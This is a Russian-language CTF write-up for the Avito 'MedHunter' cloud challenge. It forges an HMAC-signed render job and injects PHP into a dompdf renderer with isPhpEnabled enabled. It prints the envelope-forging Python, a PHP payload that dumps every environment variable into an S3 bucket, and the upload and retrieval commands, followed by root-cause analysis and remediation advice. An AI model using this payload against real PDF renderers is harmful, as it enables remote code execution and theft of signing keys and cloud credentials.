# МёдХантер: секрет подписи — технический разбор

**Флаг:** `avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}`

**Класс:** cloud / HMAC / signed job forgery / HTML injection / dompdf PHP RCE / S3 exfiltration

## Краткое техническое резюме

PDF verification code вычисляется как
`HMAC-SHA256(key=PDF_SIGNING_KEY, message=document_id)`. Известные pairs не позволяют восстановить
HMAC key, а secrets из medhunter_invite не совпадают с ним.

PDF renderer принимает HMAC-signed jobs из Object Storage. Queue signing key извлечён из backend
image в medhunter_vip, поэтому attacker может сформировать валидный job. Resume fields вставляются в HTML
без escaping, а dompdf запущен с `isPhpEnabled=true`. PHP payload в `experience` получает RCE в
renderer process и вызывает доступную global function `s3_request()`, записывая environment dump в
читаемый bucket. `PDF_SIGNING_KEY` из dump совпадает со всеми сохранёнными HMAC pairs.

**Для воспроизведения:** Нужны Storage credentials из [первой части](../medhunter_invite/medhunter_invite_writeup.md), ключ очереди из [второй](../medhunter_vip/medhunter_vip_writeup.md) и работающий PDF worker. Самотест проверяет payload и HMAC, без загрузки задания в S3.

## 1. Контекст и цель

Target application: `https://hrportal-aoa51cvc.avitoctf.ru/`.

Каждый PDF содержит `document_id` и verification code. Требуется восстановить secret, которым
подписывается code. Цепочка использует два ранее полученных capability:

- Object Storage credentials из
  [МёдХантер: приглашение](../medhunter_invite/medhunter_invite_writeup.md);
- `RENDER_QUEUE_SIGNING_KEY` и prefix `incoming/` из
  [МёдХантер: золотая звезда](../medhunter_vip/medhunter_vip_writeup.md).

Значимые renderer sources сохранены в `medhunter_signature/worker/index.php` и
`medhunter_signature/worker/render.php`.

## 2. Разведка и поверхность атаки

`worker/index.php` вычисляет verification code:

```php
$verificationCode = hash_hmac('sha256', $key, (string) $pdfSigningKey);
```

Сигнатура PHP API — `hash_hmac($algo, $data, $key)`, поэтому:

```text
message = document_id
key     = PDF_SIGNING_KEY
code    = HMAC_SHA256(PDF_SIGNING_KEY, document_id)
```

Система использует два независимых secrets:

| Secret | Назначение |
|---|---|
| `RENDER_QUEUE_SIGNING_KEY=mhq_v1_<32 hex>` | authentication job envelope |
| `PDF_SIGNING_KEY` | HMAC verification code готового PDF |

Четыре реальные пары `(document_id, verification_code)` сохранены в `pairs_sorted.txt`. Проверка
известных secrets, message encodings и перестановок HMAC arguments не даёт совпадений. Length-extension
неприменима, поскольку используется HMAC, а не `SHA256(secret || message)`.

## 3. Анализ и проверка гипотез

`worker/render.php` создаёт dompdf options:

```php
$options->set('isPhpEnabled', true);
```

`build_html()` вставляет `title`, `about`, `experience`, `skills` и `contact` без
`htmlspecialchars`. Следовательно, поле resume допускает injection:

```html
<script type="text/php"> ... </script>
```

Worker проверяет job envelope с `RENDER_QUEUE_SIGNING_KEY`. Формат подписи:

```text
payload_b64 = base64(JSON(resume))
signature   = HMAC_SHA256(MHQ_KEY, job_key + "." + payload_b64)
envelope    = {"key": job_key, "payload": payload_b64, "signature": signature}
```

Storage event запускает worker только для object key `incoming/<job-key>.json`.

Первичный payload выводил environment через `$pdf->page_text`, но generated PDF помещается в
results bucket, credentials которого недоступны. Рабочий exfiltration channel использует функцию
`s3_request()` из `index.php`. Injected PHP выполняется в том же process и записывает environment
dump в `medhunter-resumes-6d6c314a/loot/`, доступный с credentials medhunter_invite.

## 4. Корневая причина

1. User-controlled resume fields включаются в HTML без context-appropriate escaping.
2. dompdf исполняет embedded PHP из недоверенного HTML из-за `isPhpEnabled=true`.
3. Queue signing key размещён в backend image и доступен после compromise registry chain.
4. Renderer process одновременно хранит `PDF_SIGNING_KEY`, Storage credentials и executable S3
   client function.
5. Input jobs и attacker-readable exfiltration objects используют один bucket без prefix-level
   isolation.

Cryptographic primitive HMAC реализован корректно; compromise происходит через RCE в process,
который хранит secret.

## 5. Эксплуатация

Формирование signed envelope:

```python
job_key = str(uuid.uuid4())
payload_b64 = base64.b64encode(
    json.dumps(resume, separators=(",", ":")).encode()
).decode()
signature = hmac.new(
    mhq_key.encode(),
    (job_key + "." + payload_b64).encode(),
    hashlib.sha256,
).hexdigest()
```

Payload для environment exfiltration:

```php
<script type="text/php">
$dump = "";
foreach (getenv() as $name => $value) {
    $dump .= $name . "=" . $value . "\n";
}
s3_request(
    "PUT",
    getenv("STORAGE_ACCESS_KEY"),
    getenv("STORAGE_SECRET_KEY"),
    "medhunter-resumes-6d6c314a",
    "loot/dump-<uuid>.txt",
    $dump,
    "text/plain"
);
</script>
```

Ручной workflow:

```bash
uv run python medhunter_signature/exploit2.py --out medhunter_signature/exploit2.json

uv run python medhunter_signature/s3put.py put \
  medhunter-resumes-6d6c314a \
  incoming/<job-key>.json \
  medhunter_signature/exploit2.json

uv run python medhunter_signature/s3.py get \
  medhunter-resumes-6d6c314a \
  loot/dump-<uuid>.txt
```

End-to-end solver выполняет forge, PUT, polling, GET, extraction и HMAC verification:

```bash
STORAGE_ACCESS_KEY=... \
STORAGE_SECRET_KEY=... \
RENDER_QUEUE_SIGNING_KEY=mhq_v1_... \
uv run python medhunter_signature/solve_medhunter_signature.py
```

Полученный `PDF_SIGNING_KEY` проверяется по всем pairs из `pairs_sorted.txt`:

```text
HMAC_SHA256(PDF_SIGNING_KEY, document_id) == verification_code
```

Локальный self-test:

```bash
uv run python medhunter_signature/solve_medhunter_signature.py --self-test
```

## 6. Флаг

```text
avito{med0edsk_cl0ud_dompdf_rce_via_s3_l@mbda}
```

Это значение переменной environment `PDF_SIGNING_KEY`.

## 7. Выводы и рекомендации

- Отключить `isPhpEnabled` для dompdf при обработке user-controlled documents.
- Экранировать все resume fields по HTML context и применять allowlist sanitizer.
- Выполнять renderer в isolated sandbox без network egress, reusable cloud credentials и access к
  signing secrets.
- Разделить input, result и internal buckets; применять prefix-scoped IAM policies и разные service
  accounts.
- Хранить document signing key в KMS/HSM и предоставлять renderer только operation `MAC`, без export
  raw key material.
- Регулярно ротировать queue/storage/signing keys после image или IMDS compromise.
- Проверять signed job consumers на injection после signature verification: valid signature не делает
  payload trusted.

## 8. Файлы для воспроизведения

В репозитории:

- `medhunter_signature/solve_medhunter_signature.py` — one-shot forge → upload → poll → download → key verification.
- `medhunter_signature/exploit2.py` — signed job и dompdf PHP payload с S3 exfiltration.
- `medhunter_signature/s3.py`, `medhunter_signature/s3put.py` — SigV4 Object Storage clients.
- `medhunter_signature/pairs_sorted.txt` — четыре пары `document_id`/verification code.

Renderer sources и diagnostic HMAC/payload scripts не входят в набор файлов в Git;
reproduction logic объединена в `medhunter_signature/solve_medhunter_signature.py` и `medhunter_signature/exploit2.py`.
